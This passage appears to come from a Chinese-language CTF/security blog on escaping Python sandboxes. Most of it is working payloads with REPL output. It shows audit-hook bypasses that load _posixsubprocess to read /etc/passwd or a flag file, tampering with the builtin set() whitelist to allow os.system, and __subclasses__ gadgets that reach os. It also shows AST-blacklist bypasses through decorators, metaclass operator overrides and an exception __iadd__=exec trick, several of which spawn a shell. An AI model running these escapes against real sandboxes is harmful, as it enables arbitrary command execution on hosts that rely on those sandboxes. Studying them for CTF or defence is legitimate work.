class="string">&#x27;BuiltinImporter&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> ().__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&#x27;BuiltinImporter&#x27;</span> <span class="keyword">in</span> x.__name__][<span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;<span class="keyword">class</span> <span class="string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">7</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__.load_module 也有一个缺点就是无法导入非内建模块. 例如 socket</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__loader__.load_module(<span class="string">&#x27;socket&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Traceback (most recent call last):</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">290</span>, <span class="keyword">in</span> _load_module_shim</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">721</span>, <span class="keyword">in</span> _load</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">676</span>, <span class="keyword">in</span> _load_unlocked</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">573</span>, <span class="keyword">in</span> module_from_spec</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>File <span class="string">&quot;&lt;frozen importlib._bootstrap&gt;&quot;</span>, line <span class="number">776</span>, <span class="keyword">in</span> create_module</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ImportError: <span class="string">&#x27;socket&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> a built-<span class="keyword">in</span> module</span><br></pre></td></tr></table></figure>
<h4 id="posixsubprocess-执行命令">_posixsubprocess 执行命令</h4>
<p>_posixsubprocess 模块是 Python 的内部模块，提供了一个用于在 UNIX 平台上创建子进程的低级别接口。subprocess 模块的实现就用到了 _posixsubprocess.</p>
<p>该模块的核心功能是 <code>fork_exec</code> 函数，<code>fork_exec</code> 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出,每个版本的 Python 可能有所差异.</p>
<p>在我本地的 Python 3.11 中具体的函数声明如下:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fork_exec</span>(<span class="params"></span></span><br><span class="line"><span class="params">    __process_args: <span class="type">Sequence</span>[StrOrBytesPath] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __executable_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>],</span></span><br><span class="line"><span class="params">    __close_fds: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params">    __fds_to_keep: <span class="built_in">tuple</span>[<span class="built_in">int</span>, ...],</span></span><br><span class="line"><span class="params">    __cwd_obj: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    __env_list: <span class="type">Sequence</span>[<span class="built_in">bytes</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __p2cread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __p2cwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pred: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __c2pwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errread: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errwrite: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_read: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __errpipe_write: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __restore_signals: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __call_setsid: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __pgid_to_set: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __gid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __groups_list: <span class="built_in">list</span>[<span class="built_in">int</span>] | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __uid_object: SupportsIndex | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    __child_umask: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">    __preexec_fn: <span class="type">Callable</span>[[], <span class="literal">None</span>],</span></span><br><span class="line"><span class="params">    __allow_vfork: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">int</span>: ...</span><br><span class="line"></span><br><span class="line">__process_args: 传递给新进程的命令行参数，通常为程序路径及其参数的列表。</span><br><span class="line">__executable_list: 可执行程序路径的列表。</span><br><span class="line">__close_fds: 如果设置为<span class="literal">True</span>，则在新进程中关闭所有的文件描述符。</span><br><span class="line">__fds_to_keep: 一个元组，表示在新进程中需要保持打开的文件描述符的列表。</span><br><span class="line">__cwd_obj: 新进程的工作目录。</span><br><span class="line">__env_list: 环境变量列表，它是键和值的序列，例如：[“PATH=/usr/<span class="built_in">bin</span>”, “HOME=/home/user”]。</span><br><span class="line">__p2cread, __p2cwrite, __c2pred, __c2pwrite, __errread, __errwrite: 这些是文件描述符，用于在父子进程间进行通信。</span><br><span class="line">__errpipe_read, __errpipe_write: 这两个文件描述符用于父子进程间的错误通信。</span><br><span class="line">__restore_signals: 如果设置为<span class="number">1</span>，则在新创建的子进程中恢复默认的信号处理。</span><br><span class="line">__call_setsid: 如果设置为<span class="number">1</span>，则在新进程中创建新的会话。</span><br><span class="line">__pgid_to_set: 设置新进程的进程组 ID。</span><br><span class="line">__gid_object, __groups_list, __uid_object: 这些参数用于设置新进程的用户ID 和组 ID。</span><br><span class="line">__child_umask: 设置新进程的 umask。</span><br><span class="line">__preexec_fn: 在新进程中执行的函数，它会在新进程的主体部分执行之前调用。</span><br><span class="line">__allow_vfork: 如果设置为<span class="literal">True</span>，则在可能的情况下使用 vfork 而不是 fork。vfork 是一个更高效的 fork，但是使用 vfork 可能会有一些问题 。</span><br></pre></td></tr></table></figure>
<p>下面是一个最小化示例:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)xxxxxxxxxx <span class="keyword">import</span> osimport _posixsubprocess_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="keyword">import</span> os <span class="keyword">import</span> _posixsubprocess _posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>) </span><br></pre></td></tr></table></figure>
<p>结合上面的 <strong>loader</strong>.load_module(fullname) 可以得到最终的 payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>可以看到全程触发了 <code>builtins.input/result</code>, <code>compile</code>, <code>exec</code> 三个 hook, 这些 hook 的触发都是因为 input, compile, exec 函数而触发的, <strong>loader</strong>.load_module 和 _posixsubprocess 都没有触发.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[+] builtins.<span class="built_in">input</span>/result, (<span class="string">&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;</span>,)</span><br><span class="line">[+] <span class="built_in">compile</span>, (<span class="string">b&#x27;__loader__.load_module(\&#x27;_posixsubprocess\&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/flag&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(\&#x27;os\&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)&#x27;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>)</span><br><span class="line">[+] <span class="built_in">exec</span>, (&lt;code <span class="built_in">object</span> &lt;module&gt; at <span class="number">0x7fbecc924670</span>, file <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>&gt;,)</span><br></pre></td></tr></table></figure>
<p>另一种解法: <code>篡改内置函数</code></p>
<p>这道 audit hook 题还有另外一种解法.可以看到白名单是通过 set 函数返回的, <code>set</code> 作为一个内置函数实际上也是可以修改的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">WHITED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>&#125;) </span><br><span class="line"></span><br><span class="line">比如我们将 <span class="built_in">set</span> 函数修改为固定返回一个包含了 os.system 函数的列表 </span><br><span class="line"></span><br><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>] </span><br><span class="line"><span class="number">1</span></span><br><span class="line">这样 <span class="built_in">set</span> 函数会固定返回带有 os.system 的列表.</span><br><span class="line"></span><br><span class="line">__builtins__.<span class="built_in">set</span> = <span class="keyword">lambda</span> x: [<span class="string">&#x27;builtins.input&#x27;</span>, <span class="string">&#x27;builtins.input/result&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>] </span><br><span class="line"><span class="number">1</span></span><br><span class="line">最终 payload:</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;for k,v in enumerate(globals()[&#x27;__builtins__&#x27;]): print(k,v)&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="篡改函数">篡改函数</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;globals()[&#x27;__builtins__&#x27;][&#x27;set&#x27;]=lambda x: [&#x27;builtins.input&#x27;, &#x27;builtins.input/result&#x27;,&#x27;exec&#x27;, &#x27;compile&#x27;, &#x27;os.system&#x27;]\nimport os\nos.system(&#x27;cat flag2.txt&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
<h5 id="其他不触发-hook-的方式">其他不触发 hook 的方式</h5>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">使用 __loader__.load_module(<span class="string">&#x27;os&#x27;</span>) 是为了获取 os 模块, 其实在 no builtins 利用手法中, 无需导入也可以获取对应模块. 例如:</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 sys</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 os</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他的 payload 也都不会触发</span></span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="绕过-AST-沙箱">绕过 AST 沙箱</h4>
<p>AST 沙箱会将用户的输入转化为操作码,此时字符串层面的变换基本上没用了,一般情况下考虑绕过 AST 黑名单. 例如下面的沙箱禁止了 ast.Import|ast.ImportFrom|ast.Call 这三类操作, 这样一来就无法导入模块和执行函数.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">type</span>(x):</span><br><span class="line">      <span class="keyword">case</span> (ast.Import|ast.ImportFrom|ast.Call):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned statement <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">abspath = os.path.abspath(__file__)</span><br><span class="line">dname = os.path.dirname(abspath)</span><br><span class="line">os.chdir(dname)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-- Please enter code (last line must contain only --END)&quot;</span>)</span><br><span class="line">source_code = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  line = sys.stdin.readline()</span><br><span class="line">  <span class="keyword">if</span> line.startswith(<span class="string">&quot;--END&quot;</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  source_code += line</span><br><span class="line"></span><br><span class="line">tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line"><span class="keyword">if</span> verify_secure(tree):  <span class="comment"># Safe to execute!</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;-- Executing safe code:&quot;</span>)</span><br><span class="line">  compiled = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)</span><br></pre></td></tr></table></figure>
<p>下面的几种利用方式来源于 hacktricks</p>
<h4 id="without-call">without call</h4>
<p>如果基于 AST 的沙箱限制了执行函数,那么就需要找到一种不需要执行函数的方式执行系统命令.</p>
<p><code>装饰器</code></p>
<p>利用 payload 如下:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta">@input</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>当我们输入上述的代码后, Python 会打开输入,此时我们再输入 payload 就可以成功执行命令.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@exec</span></span><br><span class="line"><span class="meta">	 @input</span></span><br><span class="line">	 <span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.X&#x27;</span>&gt;<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 <span class="built_in">input</span> 接收的, 因此也不会被拦截.</span><br><span class="line"></span><br><span class="line">其实这样的话,构造其实可以有很多,比如直接打开 <span class="built_in">help</span> 函数.</span><br><span class="line"></span><br><span class="line"><span class="meta">@help</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line">这样可以直接进入帮助文档:</span><br><span class="line"></span><br><span class="line">Help on <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">in</span> module __main__:</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span>(builtins.<span class="built_in">object</span>)</span><br><span class="line"> |  Data descriptors defined here:</span><br><span class="line"> |  </span><br><span class="line"> |  __dict__</span><br><span class="line"> |      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined)</span><br><span class="line"> |  </span><br><span class="line"> |  __weakref__</span><br><span class="line"> |      <span class="built_in">list</span> of weak references to the <span class="built_in">object</span> (<span class="keyword">if</span> defined)</span><br><span class="line">(END)xxxxxxxxxx Help on <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">in</span> module __main__:<span class="keyword">class</span> <span class="title class_">X</span>(builtins.<span class="built_in">object</span>) |  Data descriptors defined here: |   |  __dict__ |      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined) |   |  __weakref__ |      <span class="built_in">list</span> of weak references to the <span class="built_in">object</span> (<span class="keyword">if</span> defined)(END)<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span> <span class="number">11</span> Help on <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">in</span> module __main__: <span class="keyword">class</span> <span class="title class_">X</span>(builtins.<span class="built_in">object</span>) |  Data descriptors defined here: |   |  __dict__ |      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined) |   |  __weakref__ |      <span class="built_in">list</span> of weak references to the <span class="built_in">object</span> (<span class="keyword">if</span> defined) (END) </span><br><span class="line"></span><br><span class="line">再次输入 !sh 即可打开 /<span class="built_in">bin</span>/sh</span><br></pre></td></tr></table></figure>
<h4 id="函数覆盖">函数覆盖</h4>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">我们知道在 Python 中获取一个的属性例如 obj[argument] 实际上是调用的 obj.__getitem__ 方法.因此我们只需要覆盖其 __getitem__ 方法, 即可在使用 obj[argument] 执行代码:</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>...     __getitem__ = <span class="built_in">exec</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>... </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>A()[<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>但是这里调用了 A 的构造函数, 因此 AST 中还是会出现 ast.Call。</span><br></pre></td></tr></table></figure>
<h4 id="metaclass-利用（如何在不执行构造函数的情况下获取类实例呢-）">metaclass 利用（如何在不执行构造函数的情况下获取类实例呢?）</h4>
<p>Python 中提供了一种元类(metaclass)概念。元类是创建类的“类”。在 Python中，类本身也是对象，元类就是创建这些类（即类的对象）的类。</p>
<p>元类在 Python 中的作用主要是用来创建类。类是对象的模板，而元类则是类的模板。元类定义了类的行为和属性，就像类定义了对象的行为和属性一样。</p>
<p>下面是基于元类的 payload, 在不使用构造函数的情况下触发</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __getitem__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub[<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>除了 <strong>getitem</strong> 之外其他方法的利用方式如下:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">__sub__ (k - <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mul__ (k * <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__floordiv__ (k // <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__truediv__ (k / <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__mod__ (k % <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__pow__ (k**<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__lt__ (k &lt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__le__ (k &lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__eq__ (k == <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ne__ (k != <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ge__ (k &gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__gt__ (k &gt; <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iadd__ (k += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__isub__ (k -= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__imul__ (k *= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ifloordiv__ (k //= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__idiv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__itruediv__ (k /= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>) (Note that this only works when <span class="keyword">from</span> __future__ <span class="keyword">import</span> division <span class="keyword">is</span> <span class="keyword">in</span> effect.)</span><br><span class="line">__imod__ (k %= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ipow__ (k **= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ilshift__ (k&lt;&lt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__irshift__ (k &gt;&gt;= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__iand__ (k = <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ior__ (k |= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br><span class="line">__ixor__ (k ^= <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>示例:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Metaclass</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __sub__ = <span class="built_in">exec</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Sub</span>(metaclass=Metaclass):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Sub-<span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="exceptions-利用">exceptions 利用</h4>
<p>利用 exceptions 的目的也是为了绕过显示地实例化一个类, 如果一个类继承了 Exception 类, 那么就可以通过 raise 关键字来实例化. payload 如下:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RCE</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span> += <span class="string">&#x27;import os; os.system(&quot;sh&quot;)&#x27;</span></span><br><span class="line">    __iadd__ = <span class="built_in">exec</span> </span><br><span class="line">    </span><br><span class="line"><span class="keyword">raise</span> RCE </span><br></pre></td></tr></table></figure>
<p>raise 会进入 RCE 的 <strong>init</strong>, 然后触发 <strong>iadd</strong> 也就是 exec.</p>
<p>当然, 触发异常不一定需要 raise, 主动地编写错误代码也可以触发,与是就有了如下的几种 payload.</p>
